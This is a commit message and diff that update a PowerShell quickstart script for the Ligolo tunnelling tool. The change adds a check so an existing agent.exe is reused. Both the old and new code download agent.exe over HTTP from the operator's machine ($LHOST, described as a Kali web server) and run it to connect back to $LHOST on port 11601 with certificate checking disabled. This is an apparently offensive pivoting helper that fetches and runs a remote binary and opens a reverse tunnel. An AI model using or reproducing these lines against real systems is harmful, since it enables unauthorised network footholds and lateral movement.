Update Ligolo_Quickstart.ps1
add download check so it doesn't hang for a little bit of time on the second download again...

+++ Ligolo_Quickstart.ps1
@@ -12,7 +12,12 @@ function Invoke-Ligolo(){
 
 mkdir C:\Temp
 cd C:\Temp
-Read-Host -Prompt "Start web server on port 80 on kali, where agent.exe resides"
-wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
-.\agent.exe -connect $LHOST':11601' -ignore-cert
+if (Test-Path -Path ".\agent.exe" -PathType Leaf) {
+    Write-Host "File agent.exe is has already been downloading. Connecting with agent.exe"
+    .\agent.exe -connect $LHOST':11601' -ignore-cert
+} else {
+    Read-Host -Prompt "Start web server on port 80 on kali, where agent.exe resides"
+    wget -usebasicparsing http://$LHOST/agent.exe -o agent.exe
+    .\agent.exe -connect $LHOST':11601' -ignore-cert
+}
 }
